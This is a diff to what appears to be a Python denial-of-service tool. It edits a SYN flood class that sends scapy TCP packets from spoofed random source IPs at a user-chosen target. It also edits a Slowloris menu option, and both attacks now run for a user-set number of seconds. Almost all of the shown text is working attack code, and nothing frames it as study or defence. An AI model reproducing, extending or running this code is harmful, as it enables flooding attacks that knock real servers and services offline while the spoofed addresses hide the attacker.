@@ -12,21 +12,20 @@ def ping():
     return 'online'
 
 class Synflood:
-    def __init__(self, ip, port, thread, pack=50):
+    def __init__(self, ip, port, thread, time_set=15):
         self.target = ip
         self.port = port
         self.thread = thread
         self.event = threading.Event()
-        self.packet = pack
+        self.time_set = time_set
 
     def start(self, port="80"):
-        t_end = time.time() + 10
+        t_end = time.time() + self.time_set
         self.event.set()
         while time.time() < t_end:
-            for i in range(self.packet):
-                fake_ip = "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
-                rand_port = random.randint(0, 65535)
-                send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port), verbose=0)
+            fake_ip = "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
+            rand_port = random.randint(0, 65535)
+            send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port), verbose=0)
         print("Thread finished\n")
 
     def sf(self):
@@ -76,18 +75,19 @@ if choose == '1':
     ip = input('IP: ')
     port = int(input('Port: '))
     threadd = int(input('Threads: '))
-    pack = int(input('Packets: '))
-    syn = Synflood(ip, port, threadd, pack)
+    time_set = int(input('Time run in second: '))
+    syn = Synflood(ip, port, threadd, time_set)
     try:
         syn.sf()
     except KeyboardInterrupt:
         syn.stop()
 elif choose == '2':
-    t_end = time.time() + 10
+    
     ip = input('IP: ')
     port = int(input('Port: '))
     sockk = int(input('Number of sockets: '))
-    packk = int(input('Number of packets: '))
+    time_set = int(input("Time run in second: "))
+    t_end = time.time() + time_set
     lor = Slowloris(ip, port)
     list_of_sockets = []
     for _ in range(sockk):
